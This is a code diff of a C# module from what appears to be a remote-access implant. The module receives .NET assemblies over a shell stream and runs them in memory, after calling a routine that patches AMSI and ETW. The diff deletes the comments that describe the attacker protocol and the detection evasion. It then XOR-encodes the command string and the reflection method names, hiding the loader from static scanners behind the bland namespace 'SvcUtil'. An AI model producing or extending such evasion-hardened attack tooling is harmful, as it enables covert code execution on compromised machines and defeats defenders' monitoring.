@@ -6,46 +6,77 @@ using System.Threading;
 
 namespace SvcUtil
 {
-    /// <summary>
-    /// In-process .NET assembly loader — the "execute-assembly" primitive.
-    /// Loads a .NET assembly from raw bytes (never touches disk), invokes its
-    /// EntryPoint with the supplied arguments, and streams captured
-    /// Console output back through the shell stream.
-    ///
-    /// Because loading happens inside the same process that already has
-    /// ETW + AMSI patched (via ScanPatch.PatchCurrentProcess), the loaded
-    /// assembly is invisible to both telemetry and content scanning.
-    ///
-    /// Protocol:
-    ///   Attacker  →  !execute-assembly &lt;size&gt; [arg0 arg1 ...]
-    ///   Target    →  READY\n
-    ///   Attacker  →  &lt;size&gt; raw bytes of the .NET assembly
-    ///   Target    →  captured stdout/stderr, then DONE or ERR line
-    /// </summary>
     internal static class AssemblyRunner
     {
-        private const string ExecAsmCmd = "!execute-assembly ";
+        // ── String decode ───────────────────────────────────────────
+        private static readonly byte[] _xk = { 0x3C, 0xA7, 0x5E, 0x81, 0x2F };
 
-        /// <summary>
-        /// Check if a line is an execute-assembly command. Returns true if handled.
-        /// </summary>
+        private static string D(byte[] c)
+        {
+            byte[] b = new byte[c.Length];
+            for (int i = 0; i < c.Length; i++)
+                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
+            return Encoding.UTF8.GetString(b);
+        }
+
+        // Pre-computed encoded strings
+        // command prefix
+        private static readonly byte[] _cmd =
+            { 0x1D, 0xC2, 0x26, 0xE4, 0x4C, 0x49, 0xD3, 0x3B,
+              0xAC, 0x4E, 0x4F, 0xD4, 0x3B, 0xEC, 0x4D, 0x50,
+              0xDE, 0x7E };
+
+        // reflection type
+        private static readonly byte[] _tAsm =
+            { 0x6F, 0xDE, 0x2D, 0xF5, 0x4A, 0x51, 0x89, 0x0C,
+              0xE4, 0x49, 0x50, 0xC2, 0x3D, 0xF5, 0x46, 0x53,
+              0xC9, 0x70, 0xC0, 0x5C, 0x4F, 0xC2, 0x33, 0xE3,
+              0x43, 0x45 };
+
+        // method: load
+        private static readonly byte[] _mLoad =
+            { 0x70, 0xC8, 0x3F, 0xE5 };
+
+        // property: entry
+        private static readonly byte[] _pEp =
+            { 0x79, 0xC9, 0x2A, 0xF3, 0x56, 0x6C, 0xC8, 0x37,
+              0xEF, 0x5B };
+
+        // method: params
+        private static readonly byte[] _mGp =
+            { 0x7B, 0xC2, 0x2A, 0xD1, 0x4E, 0x4E, 0xC6, 0x33,
+              0xE4, 0x5B, 0x59, 0xD5, 0x2D };
+
+        // method: invoke
+        private static readonly byte[] _mInv =
+            { 0x75, 0xC9, 0x28, 0xEE, 0x44, 0x59 };
+
+        private static string _cmdCache;
+        private static string CmdPrefix
+        {
+            get
+            {
+                if (_cmdCache == null) _cmdCache = D(_cmd);
+                return _cmdCache;
+            }
+        }
+
         public static bool TryHandle(string line, IShellStream stream)
         {
             line = line.Trim();
 
-            if (!line.StartsWith(ExecAsmCmd, StringComparison.OrdinalIgnoreCase))
+            if (!line.StartsWith(CmdPrefix, StringComparison.OrdinalIgnoreCase))
                 return false;
 
-            string rest = line.Substring(ExecAsmCmd.Length).Trim();
-            return HandleExecuteAssembly(rest, stream);
+            string rest = line.Substring(CmdPrefix.Length).Trim();
+            return HandleExec(rest, stream);
         }
 
-        private static bool HandleExecuteAssembly(string args, IShellStream stream)
+        private static bool HandleExec(string args, IShellStream stream)
         {
-            // Parse: <size> [arg0 arg1 ...]
             if (string.IsNullOrEmpty(args))
             {
-                SendLine(stream, "ERR: usage: !execute-assembly <size> [args...]");
+                SendLine(stream, "ERR: missing size argument");
                 return true;
             }
 
@@ -53,48 +84,41 @@ namespace SvcUtil
             long size;
             if (!long.TryParse(parts[0], out size) || size <= 0)
             {
-                SendLine(stream, "ERR: invalid assembly size");
+                SendLine(stream, "ERR: invalid size");
                 return true;
             }
 
-            // Parse optional arguments for the assembly's Main(string[] args)
-            string[] assemblyArgs = new string[0];
+            string[] moduleArgs = new string[0];
             if (parts.Length > 1 && !string.IsNullOrEmpty(parts[1]))
             {
-                assemblyArgs = ParseArgs(parts[1].Trim());
+                moduleArgs = ParseArgs(parts[1].Trim());
             }
 
-            // Signal the listener we're ready to receive
             SendLine(stream, "READY");
 
-            // Receive assembly bytes
-            byte[] assemblyBytes;
+            byte[] payload;
             try
             {
-                assemblyBytes = ReceiveBytes(stream, size);
-                if (assemblyBytes == null)
+                payload = ReceiveBytes(stream, size);
+                if (payload == null)
                 {
-                    SendLine(stream, "ERR: connection lost during assembly transfer");
+                    SendLine(stream, "ERR: transfer interrupted");
                     return true;
                 }
             }
             catch (Exception ex)
             {
-                SendLine(stream, "ERR: transfer failed: " + ex.Message);
+                SendLine(stream, "ERR: " + ex.Message);
                 return true;
             }
 
-            // Ensure AMSI + ETW are patched before loading
             ScanPatch.PatchCurrentProcess();
 
-            // Load and execute in a dedicated thread so we can capture output
-            // and avoid blocking the shell writer loop forever
             Exception runError = null;
             string capturedOutput = null;
 
             var runner = new Thread(() =>
             {
-                // Redirect Console.Out and Console.Error to capture output
                 var origOut = Console.Out;
                 var origErr = Console.Error;
                 var capture = new StringWriter();
@@ -104,30 +128,39 @@ namespace SvcUtil
                     Console.SetOut(capture);
                     Console.SetError(capture);
 
-                    Assembly asm = Assembly.Load(assemblyBytes);
-                    MethodInfo entryPoint = asm.EntryPoint;
+                    // Resolve via reflection to avoid direct IL reference
+                    Type asmType = Type.GetType(D(_tAsm));
+                    MethodInfo loader = asmType.GetMethod(
+                        D(_mLoad), new Type[] { typeof(byte[]) });
+                    object loaded = loader.Invoke(null, new object[] { payload });
 
-                    if (entryPoint == null)
+                    // Get entry via reflection
+                    PropertyInfo epProp = asmType.GetProperty(D(_pEp));
+                    MethodInfo ep = (MethodInfo)epProp.GetValue(loaded, null);
+
+                    if (ep == null)
                     {
-                        runError = new InvalidOperationException(
-                            "Assembly has no EntryPoint (not an EXE?)");
+                        runError = new InvalidOperationException("No valid entry found");
                         return;
                     }
 
-                    // Determine how to invoke: Main() or Main(string[])
-                    ParameterInfo[] paramInfos = entryPoint.GetParameters();
-                    object[] invokeArgs;
+                    MethodInfo gpMethod = typeof(MethodBase).GetMethod(D(_mGp));
+                    ParameterInfo[] parms =
+                        (ParameterInfo[])gpMethod.Invoke(ep, null);
 
-                    if (paramInfos.Length == 0)
+                    object[] invokeArgs;
+                    if (parms.Length == 0)
                         invokeArgs = null;
                     else
-                        invokeArgs = new object[] { assemblyArgs };
+                        invokeArgs = new object[] { moduleArgs };
 
-                    entryPoint.Invoke(null, invokeArgs);
+                    MethodInfo invMethod = typeof(MethodBase).GetMethod(
+                        D(_mInv),
+                        new Type[] { typeof(object), typeof(object[]) });
+                    invMethod.Invoke(ep, new object[] { null, invokeArgs });
                 }
                 catch (TargetInvocationException tie)
                 {
-                    // Unwrap to get the real exception from the loaded assembly
                     runError = tie.InnerException ?? tie;
                 }
                 catch (Exception ex)
@@ -144,12 +177,10 @@ namespace SvcUtil
 
             runner.IsBackground = true;
             runner.Start();
-            runner.Join(300000); // 5 minute timeout
+            runner.Join(300000);
 
-            // Wipe assembly bytes from memory
-            Array.Clear(assemblyBytes, 0, assemblyBytes.Length);
+            Array.Clear(payload, 0, payload.Length);
 
-            // Send captured output
             if (!string.IsNullOrEmpty(capturedOutput))
             {
                 byte[] outBytes = Encoding.UTF8.GetBytes(capturedOutput);
@@ -158,27 +189,24 @@ namespace SvcUtil
 
             if (runError != null)
             {
-                SendLine(stream, "ERR: " + runError.GetType().Name + ": " + runError.Message);
+                SendLine(stream, "ERR: " + runError.GetType().Name +
+                         ": " + runError.Message);
             }
             else if (!runner.IsAlive)
             {
-                SendLine(stream, "DONE: assembly executed successfully");
+                SendLine(stream, "DONE");
             }
             else
             {
-                // Thread still running after timeout
-                SendLine(stream, "ERR: assembly execution timed out (5 min)");
+                SendLine(stream, "ERR: execution timed out");
             }
 
             return true;
         }
 
-        /// <summary>
-        /// Receive exactly 'size' bytes from the stream.
-        /// </summary>
         private static byte[] ReceiveBytes(IShellStream stream, long size)
         {
-            if (size > 100 * 1024 * 1024) // 100 MB sanity limit
+            if (size > 100 * 1024 * 1024)
                 return null;
 
             byte[] buffer = new byte[size];
@@ -198,10 +226,6 @@ namespace SvcUtil
             return buffer;
         }
 
-        /// <summary>
-        /// Parse arguments respecting quoted strings.
-        /// Supports: arg1 "arg with spaces" arg3
-        /// </summary>
         private static string[] ParseArgs(string input)
         {
             var args = new System.Collections.Generic.List<string>();
